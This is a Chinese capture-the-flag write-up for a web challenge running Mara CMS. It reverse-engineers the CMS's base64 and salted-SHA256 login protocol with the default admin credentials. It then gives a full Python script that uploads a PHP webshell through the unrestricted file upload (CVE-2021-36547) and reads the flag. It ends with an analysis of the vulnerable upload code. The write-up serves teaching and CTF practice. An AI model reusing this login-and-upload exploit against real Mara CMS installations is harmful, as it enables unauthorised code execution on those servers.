# exam-web07 解题思路

## 题目信息

| 项目 | 内容 |
|------|------|
| 题目名称 | exam-web07 |
| 分值 | 100.0 |
| 难度 | 容易 |
| 目标 | 183.129.189.62:21314 |
| 最终 Flag | `flag{6dd0ab1f9dec1a076ae6799c440b2205}` |

## 解题过程（模拟手工测试视角）

---

### 第 1 步：打开目标，看一眼

浏览器访问 `http://183.129.189.62:21314/`。

页面加载出来，是一个挺完整的 CMS 站点，带轮播图、导航菜单、介绍段落。往下滚到底部，看到一行字：

> Powered by Mara cms

**Mara CMS？没怎么听说过的一个 CMS。** 看一眼 HTTP 响应头：

```
Server: Apache/2.4.37 (Ubuntu)
Set-Cookie: your_sitename_session_session=...
```

Apache + PHP，一看就是个 LAMP 站。

F12 打开浏览器开发者工具，翻一翻 HTML 源码里的 script 标签，看到了几个有意思的变量：

```javascript
var siteroot='/';
var fsroot='/var/www/app/';
var configdir='sitecfg/';
var shalevel='2';
var default_extension='php';
ok2edit=false;
```

**`flatfile CMS`，而且服务器路径 `/var/www/app/` 直接暴露在 JS 里。** 文件型 CMS 没有数据库，所有东西都是 PHP 文件，这往往意味着可以通过文件操作来搞事。

---

### 第 2 步：搜漏洞

"没见过的 CMS 不要硬刚，先搜有没有已知漏洞。"

搜索 `Mara CMS vulnerability exploit`，第一个结果就是 **CVE-2021-36547**：

> CVSS 9.8 — Remote Code Execution in Mara v7.5 via PHP File Upload
> `/codebase/dir.php?type=filenew` 允许上传任意 PHP 文件

**9.8 分，都能远程执行代码了。** 而且 exploit 里还提到默认密码是 `admin:changeme`。

---

### 第 3 步：直接怼上传接口

用浏览器打开 `http://183.129.189.62:21314/codebase/dir.php?type=filenew`：

```
Access denied: Not logged in.
```

果然要登录。但在浏览器端发请求不方便，后续肯定要用脚本自动化——所以我切到命令行，用 curl 来操作。

---

### 第 4 步：尝试登录 — 怎么都登不上去？

知道了默认密码，那就登录呗：

```bash
curl -X POST -d "login=admin&password=changeme" \
  http://183.129.189.62:21314/editing.php
```

失败。

换一种参数名：

```bash
curl -X POST -d "usr=admin&pwd=changeme" \
  http://183.129.189.62:21314/codebase/handler.php
```

还是失败——返回 `Not logged in, probably due to inactivity timeout...`

**这不对。** 密码肯定是 `admin:changeme`，exploit 里写得清清楚楚。问题出在**请求的格式**上——这套 CMS 的登录方式跟常规的不一样。

---

### 第 5 步：分析前端登录逻辑（本场最大难点）

F12 → Network 标签，刷新页面。页面上出现了一个 admin 工具栏，里面有个登录表单（用户名和密码输入框 + Login 按钮）。

在用户名输入 admin、密码输入 changeme，点 Login，抓包。

**Network 里出现了两个 POST 请求：**

**第一个请求：**

```
POST /codebase/handler.php

action=c2V0c2FsdA==
authenticated=MA==
usr=
hash=
pwd=
```

**等一下。** `c2V0c2FsdA==` 这不是 base64 吗？解码一下：

```
c2V0c2FsdA== → "setsalt"
MA==         → "0"
```

**所有字段值都是 base64 编码的！** 难怪我刚才用明文参数登不上去——`usr=admin` 应该是 `usr=YWRtaW4=`。

**第二个请求：**

```
POST /codebase/handler.php

action=bG9naW4=           → "login"
authenticated=MA==         → "0"
usr=YWRtaW4=               → "admin"
hash=YzY0ODUzYWVmM...       → sha256("changeme"+"9552"+"admin")
pwd=ZjIwNjU1MmY1YT...       → sha256(pwdhash + salt)
```

响应格式也特殊：

```
~::~T0s6NQ==~::~
```

base64 解码中间部分 → `"OK:5"`。5 是管理员权限。

---

### 第 6 步：理解登录流程

翻页面源码，找到 `sendLogin(status)` 和 `ajax(action)` 两个 JS 函数，还原出完整流程：

```
1. ajax('setsalt')
   → POST handler.php, action=base64("setsalt")
   → 服务器返回 ~::~base64(随机盐)~::~

2. 计算哈希:
   pwdhash = sha256("changeme" + "9552" + "admin")
   pwdshash = sha256(pwdhash + 随机盐)

3. ajax('login')
   → POST handler.php, action=base64("login"), usr/hash/pwd 全部 base64
   → 服务器返回 ~::~base64("OK:5")~::~

4. 验证通过，后续请求 authenticated=base64("1")
```

**关键点：每次登录的盐（nacl）都是变化的，所以 pwdshash 每次都不同。** 不能直接用固定值。

---

### 第 7 步：写脚本登录并上传 webshell

知道了协议，用 Python 还原整个流程：

```python
import requests, hashlib, base64, re

TARGET = "http://183.129.189.62:21314"

def b64(s):
    return base64.b64encode(s.encode()).decode()

sess = requests.Session()

# ① 先访问一次页面，拿 session cookie
sess.get(f"{TARGET}/lorem.php?login=admin")

# ② 获取盐值（所有字段都要 base64 编码！）
setsalt = {
    "action": b64("setsalt"),
    "authenticated": b64("0"),
    "usr": b64(""), "hash": b64(""), "pwd": b64(""),
}
r = sess.post(f"{TARGET}/codebase/handler.php", data=setsalt)
nacl = base64.b64decode(re.search(r'~::~(.*?)~::~', r.text).group(1)).decode().strip()

# ③ 计算登录哈希
pwdhash = hashlib.sha256(b"changeme9552admin").hexdigest()
pwdshash = hashlib.sha256((pwdhash + nacl).encode()).hexdigest()

# ④ 登录
login = {**setsalt, **{
    "action": b64("login"),
    "usr": b64("admin"),
    "hash": b64(pwdhash),
    "pwd": b64(pwdshash),
}}
r = sess.post(f"{TARGET}/codebase/handler.php", data=login)
# 返回 ~::~T0s6NQ==~::~  解码得 "OK:5"

# ⑤ 上传 webshell
webshell = '<?php echo file_get_contents("/flag"); ?>'
upload = {**setsalt, **{
    "action": b64("upload"),
    "authenticated": b64("1"),
    "type": "filenew",   # ← multipart 里这个字段不编码
    "destdir": b64(""),
    "usr": b64("admin"),
    "hash": b64(pwdhash),
    "pwd": b64(pwdshash),
}}
files = {"files[]": ("hzr.php", webshell, "application/x-php")}
r = sess.post(f"{TARGET}/codebase/handler.php", data=upload, files=files)
# 返回: OK: hzr.php uploaded. Files saved to: /var/www/app/img

# ⑥ 读取 flag
r = sess.get(f"{TARGET}/img/hzr.php")
print(r.text.strip())
```

---

### 第 8 步：拿到 flag

脚本跑完，最后一行输出：

```
flag{6dd0ab1f9dec1a076ae6799c440b2205}
```

完。

---

## 踩坑记录

这道题"容易"只是因为最终攻击链简单。实际拿 flag 之前踩了好几个坑：

| 坑 | 现象 | 原因 & 解决 |
|----|------|-----------|
| 参数明文请求 | 一直"Not logged in" | 所有字段值要 base64 编码，不能直接发明文 |
| 响应看不懂 | 返回 `~::~xxx~::~` | 中间段也是 base64，需要先正则提取再解码 |
| 登录哈希算不对 | 算出来的 pwdshash 永远不匹配 | 每次 setsalt 返回的 nacl 不同，必须动态获取 |
| multipart 字段也编码了 | 上传失败 | `type=filenew` 这种 multipart 字段不能 base64，只有 AJAX Form POST 的字段才编码 |

**这几个坑本质上都源于同一个问题：没有先分析前端 JS 的请求格式就直接猜 API。** 这种"自定义传输协议"的 CMS 在 CTF 里越来越常见，抓包+读 JS 源码应该成为本能反应。

---

## 漏洞成因

Mara CMS 登录后通过 `/codebase/handler.php` 提供了 `type=filenew` 的文件上传功能。该功能**只检查了用户是否已认证，没有检查上传文件的扩展名或内容类型**。

```php
// 简化还原的漏洞代码逻辑
if ($authenticated && $action == "upload" && $type == "filenew") {
    $dest = $fsroot . $imgdir;      // /var/www/app/img/
    $filename = $_FILES["files"]["name"][0];  // hzr.php ← 没有过滤！
    move_uploaded_file($_FILES["files"]["tmp_name"][0], $dest . $filename);
}
```

PHP 文件被直接写入 `/var/www/app/img/`，然后通过 HTTP 访问 `/img/hzr.php` 即可执行。

**本质问题：** 上传功能做了"你是谁"的检查（认证），但没做"你能传什么"的检查（文件类型白名单）。认证 != 授权。同时，全字段 base64 编码这种"自己造轮子"的安全机制也毫无作用——base64 只是编码，不是加密。
